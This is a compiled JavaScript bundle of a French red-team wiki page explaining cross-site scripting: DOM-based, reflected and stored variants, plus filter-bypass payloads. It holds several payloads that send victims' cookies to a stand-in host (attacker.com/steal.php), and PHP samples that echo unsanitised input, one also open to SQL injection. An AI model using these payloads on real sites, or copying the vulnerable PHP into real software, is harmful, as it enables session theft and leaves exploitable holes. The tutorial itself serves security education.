"use strict";(globalThis.webpackChunkazurwiki=globalThis.webpackChunkazurwiki||[]).push([[414],{1672:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"redteam/Attaques Web/XSS","title":"XSS, k\xe9sako ?","description":"XSS, k\xe9sako ?","source":"@site/docs/20-redteam/02-Attaques Web/01-XSS.md","sourceDirName":"20-redteam/02-Attaques Web","slug":"/redteam/Attaques Web/XSS","permalink":"/azurwiki/redteam/Attaques Web/XSS","draft":false,"unlisted":false,"editUrl":"https://github.com/haysberg/azurwiki/tree/main/docs/docs/20-redteam/02-Attaques Web/01-XSS.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"XSS, k\xe9sako ?","sidebar_label":"XSS","pagination_label":"XSS, k\xe9sako ?","description":"XSS, k\xe9sako ?","keywords":["docs","OSINT"]},"sidebar":"tutorialSidebar","previous":{"title":"Crochetage","permalink":"/azurwiki/redteam/lockpick"},"next":{"title":"SSTI Flask","permalink":"/azurwiki/redteam/Attaques Web/SSTI Flask"}}');var r=s(4848),i=s(8453);const a={title:"XSS, k\xe9sako ?",sidebar_label:"XSS",pagination_label:"XSS, k\xe9sako ?",description:"XSS, k\xe9sako ?",keywords:["docs","OSINT"]},o=void 0,c={},l=[{value:"Qu&#39;est ce qu&#39;une XSS ?",id:"quest-ce-quune-xss-",level:2},{value:"Introduction",id:"introduction",level:3},{value:"XSS bas\xe9 sur le DOM",id:"xss-bas\xe9-sur-le-dom",level:3},{value:"XSS r\xe9fl\xe9chi",id:"xss-r\xe9fl\xe9chi",level:3},{value:"XSS stock\xe9",id:"xss-stock\xe9",level:3},{value:"Payloads exotiques",id:"payloads-exotiques",level:3}];function u(e){const t={a:"a",code:"code",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(t.h2,{id:"quest-ce-quune-xss-",children:"Qu'est ce qu'une XSS ?"}),"\n",(0,r.jsx)(t.h3,{id:"introduction",children:"Introduction"}),"\n",(0,r.jsxs)(t.p,{children:["L'attaque par Cross-Site Scripting, commun\xe9ment appel\xe9e XSS, est une attaque qui est pratiqu\xe9e sur des applications web. Elle est actuellement une attaque d\xe9vastatrice et \xe0 prendre au s\xe9rieux (",(0,r.jsx)(t.a,{href:"https://owasp.org/Top10/fr/",children:"3\u1d49 du top 10 OWASP"}),") \ud83d\ude31\ud83d\ude31. Cette technique exploite les entr\xe9es utilisateurs qui ne sont pas d\xe9sinfect\xe9es par le d\xe9veloppeur. On va donc passer par des requ\xeates HTTP GET/POST pour injecter nos payloads et pouvoir toucher les autres utilisateurs."]}),"\n",(0,r.jsx)(t.p,{children:"Il existe trois variantes principales de cette attaque :"}),"\n",(0,r.jsxs)(t.ul,{children:["\n",(0,r.jsx)(t.li,{children:"le XSS bas\xe9 sur le DOM"}),"\n",(0,r.jsx)(t.li,{children:"le XSS r\xe9fl\xe9chi"}),"\n",(0,r.jsx)(t.li,{children:"le XSS stock\xe9"}),"\n"]}),"\n",(0,r.jsx)(t.p,{children:"Pour savoir laquelle nous allons utiliser, il va falloir voir de quoi se compose le serveur web que nous attaquons."}),"\n",(0,r.jsx)(t.h3,{id:"xss-bas\xe9-sur-le-dom",children:"XSS bas\xe9 sur le DOM"}),"\n",(0,r.jsx)(t.p,{children:"La XSS bas\xe9 sur le DOM est une attaque XSS non persistante qui s'ex\xe9cute c\xf4t\xe9 client. C'est-\xe0-dire que notre objectif n'est pas de la maintenir dans une base de donn\xe9e du serveur et de la propager \xe0 tous les utilisateurs. Nous allons plut\xf4t cr\xe9er une URL qui sera ex\xe9cut\xe9 par le code JS c\xf4t\xe9 client :"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.code,{children:"http://target.com/search?request=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;<\/script>"})}),"\n",(0,r.jsx)(t.p,{children:"Voici notre URI, d\xe9cortiquons l\xe0 :"}),"\n",(0,r.jsxs)(t.p,{children:["Nous avons d'abord notre site cible : ",(0,r.jsx)(t.code,{children:"http://target.com/search"}),", on va chercher la page qui contient un formulaire ou qui n\xe9cessite un argument dans l'URL."]}),"\n",(0,r.jsxs)(t.p,{children:[(0,r.jsx)(t.code,{children:"?request="})," est l'argument dans lequel on va int\xe9grer notre script JS."]}),"\n",(0,r.jsxs)(t.p,{children:[(0,r.jsx)(t.code,{children:"<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;<\/script>"}),", ici on utilise ",(0,r.jsx)(t.a,{href:"https://developer.mozilla.org/fr/docs/Web/API/Document/location",children:"document.location"})," pour rediriger l'utilisateur vers ",(0,r.jsx)(t.code,{children:"http://attacker.com/steal.php"})," qui sera notre site de r\xe9ception de cookie, on ajoute l'argument ",(0,r.jsx)(t.code,{children:"cookie='+document.cookie"})," pour rediriger les cookies de la victime vers notre site \ud83d\ude03"]}),"\n",(0,r.jsx)(t.p,{children:"La diff\xe9rence avec une XSS r\xe9fl\xe9chi, c'est que le notre URL sera ex\xe9cut\xe9 c\xf4t\xe9 client et non par le serveur !"}),"\n",(0,r.jsx)(t.p,{children:"Par exemple, si c\xf4t\xe9 client, vous avez un code qui r\xe9cup\xe8re les arguments et les affiche dans le DOM :"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-javascript",children:"var url = document.location.href;\nvar message = url.split(\"message=\")[1];\ndocument.getElementById('welcomeMessage').innerText = message;\n"})}),"\n",(0,r.jsx)(t.p,{children:"Alors, lorsque l'utilisateur visite cette URL (par phising la plupart du temps), le code JS extrait le message \xe0 partir de l'URL et l'injecte directement dans la page, ce qui conduit \xe0 l'ex\xe9cution du code."}),"\n",(0,r.jsx)(t.h3,{id:"xss-r\xe9fl\xe9chi",children:"XSS r\xe9fl\xe9chi"}),"\n",(0,r.jsx)(t.p,{children:"L'attaque XSS r\xe9fl\xe9chi vient du fait que l'attaque est bas\xe9e sur la r\xe9ponse du serveur \xe0 une requ\xeate, elle rentre en opposition avec la XSS bas\xe9 sur le DOM qui ex\xe9cute le code cot\xe9 client.\nCette variante est aussi non persistante et sera aussi exploiter par le phising"}),"\n",(0,r.jsx)(t.p,{children:"Reprenons notre payload :"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.code,{children:"http://target.com/search?request=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;<\/script>"})}),"\n",(0,r.jsx)(t.p,{children:"Si le serveur a un script php de ce style qui extrait et affiche la requ\xeate :"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-php",children:'<?php\n$request = $_GET[\'request\'];\n?>\n<html>\n    <body>\n        <form method="GET" action="">\n            <input type="text" name="request" placeholder="Enter search request" />\n            <input type="submit" value="Search" />\n        </form>\n        <?php\n        if ($request) {\n            echo "You searched for: " . $request;\n        }\n        ?>\n    </body>\n</html>\n'})}),"\n",(0,r.jsx)(t.p,{children:"Alors le serveur renverra une page avec notre code qui sera ins\xe9r\xe9 dedans."}),"\n",(0,r.jsx)(t.h3,{id:"xss-stock\xe9",children:"XSS stock\xe9"}),"\n",(0,r.jsxs)(t.p,{children:["Pour la XSS stock\xe9, consid\xe9rons un site web avec un forum de discussion o\xf9 les utilisateurs peuvent poster des commentaires. Si le site ne v\xe9rifie pas correctement le contenu des messages, un attaquant pourrait poster un commentaire contenant du code JS, comme notre fameux payload ",(0,r.jsx)(t.code,{children:"<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;<\/script>"}),". Ce commentaire serait alors stock\xe9 sur la base de donn\xe9e du site et chaque fois qu'un autre utilisateur affichera ce commentaire sur son navigateur, le code malveillant serait ex\xe9cut\xe9.\nVoici un exemple de script php qui stocke les inputs que les utilisateurs envoient :"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-php",children:"<?php\n$db = new SQLite3('comments.db');\n$db->exec(\"CREATE TABLE IF NOT EXISTS comments (comment TEXT)\");\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $comment = $_POST['comment'];\n    $db->exec(\"INSERT INTO comments (comment) VALUES ('$comment')\");\n}\n?>\n\n<!DOCTYPE html>\n<html>\n<body>\n<form method=\"post\" action=\"\">\n    <textarea name=\"comment\"></textarea>\n    <input type=\"submit\" value=\"Submit comment\">\n</form>\n\n<?php\n$results = $db->query('SELECT * FROM comments');\nwhile ($row = $results->fetchArray()) {\n    echo $row['comment'] . '<br />';\n}\n?>\n\n</body>\n</html>\n"})}),"\n",(0,r.jsx)(t.p,{children:"Ici la premi\xe8re partie du code PHP int\xe8gre le commentaire \xe0 la base de donn\xe9es. Puis la seconde partie affiche tout les commentaires.\nComme pour les autres variantes, d\xe8s qu'un utilisateur affichera la page, le code malveillant sera ex\xe9cut\xe9."}),"\n",(0,r.jsx)(t.h3,{id:"payloads-exotiques",children:"Payloads exotiques"}),"\n",(0,r.jsx)(t.p,{children:"Souvent des normes de s\xe9curit\xe9s sont mises en place pour supprimer les balises script, il faut donc ruser pour pouvoir injecter notre payload.\nPar exemple celui-ci :"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-html",children:"<img src/onerror=document.location='http://attacker.com/steal.php?cookie='+document.cookie;>\n"})}),"\n",(0,r.jsx)(t.p,{children:"Ce payload ajoute une balise image au DOM qui n'a pas de source ce qui appellera onerror et lancera notre script."}),"\n",(0,r.jsx)(t.p,{children:"Ou encore ce payload :"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-html",children:"<a onclick=\"document.location='http://attacker.com/steal.php?cookie='+document.cookie;\" style=display:block>test</a>\n"})}),"\n",(0,r.jsxs)(t.p,{children:["Ici, on ajoute un lien avec la balise ",(0,r.jsx)(t.code,{children:"a"})," qui utilise ",(0,r.jsx)(t.code,{children:"onclick"})," pour activer le script.\nCe payload demande que la victime interagisse plus et sera moins efficace."]}),"\n",(0,r.jsxs)(t.p,{children:["Beaucoup de payload existe et je vous recommande ",(0,r.jsx)(t.a,{href:"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",children:"PortSwigger"})," pour explorer un peu les possibilit\xe9s \ud83d\ude01"]})]})}function d(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,r.jsx)(t,{...e,children:(0,r.jsx)(u,{...e})}):u(e)}},8453:(e,t,s)=>{s.d(t,{R:()=>a,x:()=>o});var n=s(6540);const r={},i=n.createContext(r);function a(e){const t=n.useContext(i);return n.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),n.createElement(i.Provider,{value:t},e.children)}}}]);